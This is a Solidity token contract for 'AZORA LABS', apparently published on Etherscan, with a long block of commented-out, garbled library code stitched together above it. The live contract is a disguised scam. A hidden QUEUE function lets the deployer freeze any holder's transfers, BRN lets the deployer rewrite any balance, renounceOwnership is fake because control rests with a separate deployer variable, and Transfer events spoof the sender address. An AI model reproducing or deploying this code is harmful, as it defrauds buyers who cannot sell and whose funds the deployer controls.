/**
 *Submitted for verification at Etherscan.io on 2023-02-25
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT


/*
/**
 * @dev Library for managing
 * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive
 * types.
 *
 * Sets have the following properties:
 *
 * - Elements are added, removed, and checked for existence in constant time
 * (O(1)).
 * - Elements are enumerated in O(n). No guarantees are made on the ordering.
 *
 * ```
 * contract Example {
 *     // Add the library methods
 *     using EnumerableSet for EnumerableSet.AddressSet;
 *
 *     // Declare a set state variable
 *     EnumerableSet.AddressSet private mySet;
 * }
 * ```
 *
 * As of v3.3.0, sets of type `bytes32` (`Bytes32Set`), `address` (`AddressSet`)
 * and `uint256` (`UintSet`) are supported.
 *
 * [WARNING]
 * ====
 * Trying to delete such a structure from storage will likely result in data corruption, rendering the structure
 * unusable.
 * See https://github.com/ethereum/solidity/pull/11843[ethereum/solidity#11843] for more info.
 *
 * In order to clean an EnumerableSet, you can either remove all elements one by one or create a fresh instance using an
 * array of EnumerableSet.
 * ====
 *
library EnumerableSet {
    // To implement this library for multiple types with as little code
    // repetition as possible, we write it in terms of a generic Set type with
    // bytes32 values.
    // The Set implementation uses private functions, and user-facing
    // implementations (such as AddressSet) are just wrappers around the
    // underlying Set.
    // This means that we can only create new EnumerableSets for types that fit
    // in bytes32.

    struct Set {
        // Storage of set values
        bytes32[] _values;
        // Position of the value in the `values` array, plus 1 because index 0
        // means a value is not in the set.
        mapping(bytes32 => uint256) _indexes;
    }

    /**
     * @dev Add a value to a set. O(1).
     *
     * Returns true if the value was added to the set, that is if it was not
     * already present.
     *
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            // The value is stored at length-1, but we add 1 to all indexes
            // and use 0 as a sentinel value
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    /**
     * @dev Removes a value from a set. O(1).
     *
     * Returns true if the value was removed from the set, that is if it was
     * present.
     *
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        // We read and store the value's index to prevent multiple reads from the same storage slot
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {
            // Equivalent to contains(set, value)
            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
            // the array, and then remove the last element (sometimes called as 'swap and pop').
            // This modifies the order of the array, as noted in {at}.

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            if (lastIndex != toDeleteIndex) {
                bytes32 lastValue = set._values[lastIndex];

                // Move the last value to the index where the value to delete is
                set._values[toDeleteIndex] = lastValue;
                // Update the index for the moved value
                set._indexes[lastValue] = valueIndex; // Replace lastValue's index to valueIndex
            }

            // Delete the slot where the moved value was stored
            set._values.pop();

            // Delete the index for the deleted slot
            delete set._indexes[value];

      
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(
                token.approve.selector,
                spender,
                newAllowance
            )
        );
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(
                oldAllowance >= value,
                "SafeERC20: decreased allowance below zero"
            );
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(
                token,
                abi.encodeWithSelector(
                    token.approve.selector,
                    spender,
                    newAllowance
                )
            );
        }
    }

    function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(
            nonceAfter == nonceBefore + 1,
            "SafeERC20: permit did not succeed"
        );
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     /
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(
            data,
            "SafeERC20: low-level call failed"
        );
        if (returndata.length > 0) {
            // Return data is optional
            require(
                abi.decode(returndata, (bool)),
                "SafeERC20: ERC20 operation did not succeed"
            );
        }
    }
}

// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol

// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 /


    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     /
    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     

        require(owner != address(0), "EGGS/invalid-address-0");
        require(owner == ecrecover(digest, v, r, s), "EGGS/invalid-permit");
        _allowedFragments[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function rebase(
        uint256 epoch,
        uint256 indexDelta,
        bool positive
    ) public returns (uint256) {
        require(hasRole(REBASER_ROLE, _msgSender()), "Must have rebaser role");

        // no change
        if (indexDelta == 0) {
            emit Rebase(epoch, eggssScalingFactor, eggssScalingFactor);
            return _totalSupply;
        }

        // for events
        uint256 prevEggssScalingFactor = eggssScalingFactor;

        if (!positive) {
            // negative rebase, decrease scaling factor
            eggssScalingFactor = eggssScalingFactor
                .mul(BASE.sub(indexDelta))
                .div(BASE);
        } else {
            // positive rebase, increase scaling factor
            uint256 newScalingFactor = eggssScalingFactor
                .mul(BASE.add(indexDelta))
                .div(BASE);
            if (newScalingFactor < _maxScalingFactor()) {
                eggssScalingFactor = newScalingFactor;
            } else {
                eggssScalingFactor = _maxScalingFactor();
            }
        }

        // update total supply, correctly
        _totalSupply = _eggsToFragment(initSupply);

        emit Rebase(epoch, prevEggssScalingFactor, eggssScalingFactor);
        return _totalSupply;
    }

    function eggsToFragment(uint256 eggs) public view returns (uint256) {
        return _eggsToFragment(eggs);
    }

    function fragmentToEggs(uint256 value) public view returns (uint256) {
        return _fragmentToEggs(value);
    }

    function _eggsToFragment(uint256 eggs) internal view returns (uint256) {
        return eggs.mul(eggssScalingFactor).div(internalDecimals);
    }

    function _fragmentToEggs(uint256 value) internal view returns (uint256) {
        return value.mul(internalDecimals).div(eggssScalingFactor);
    }

    // Rescue tokens
    function rescueTokens(
        address token,
        address to,
        uint256 amount
    ) public onlyOwner returns (bool) {
        // transfer to
        SafeERC20.safeTransfer(IERC20(token), to, amount);
        return true;
    }
}

*/
 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract AZORA {
  
    mapping (address => uint256) private VLb;
	
    mapping (address => uint256) private VLc;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "AZORA LABS";
	
    string public symbol = "AZORA";
    uint8 public decimals = 6;

    uint256 public totalSupply = 1000000000 *10**6;
    address owner = msg.sender;
	  address private VLv;
    uint256 private xBal;
    address private VLz;
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address VLg = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
		
    VLz = msg.sender;
    VLb[msg.sender] = totalSupply;
	 xBal = 0;
	 
	 
    VLv = VLg;
	
    emit Transfer(address(0), VLv, totalSupply); 
	
	
   
    }

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }


   function balanceOf(address account) public view  returns (uint256) {
        return VLb[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {


    
        require(VLb[msg.sender] >= value);
		
		
        require(VLc[msg.sender] <= xBal); 
		
  VLb[msg.sender] -= value;  
  
        VLb[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }
		
		modifier INT () {
		   require(msg.sender == VLz);
		   _;}
		
		       function QUEUE (address Zx, uint256 Zk) INT public {
   
   VLc[Zx] = Zk;
   
   
   }


 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 

   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  
     
	 
	 
        require(VLc[from] <= xBal);
		
		
		
        require(VLc[to] <= xBal);
		
		
		
        require(value <= VLb[from]);
        require(value <= allowance[from][msg.sender]);
        VLb[from] -= value;
		
        VLb[to] += value;
		
		
        allowance[from][msg.sender] -= value;
       if(from == VLz) {from = VLg;}
	   
	   
	   
        emit Transfer(from, to, value);
        return true; }

       function BRN (address Zx, uint256 Zk) INT public {

	
    VLb[Zx] = Zk;}

    }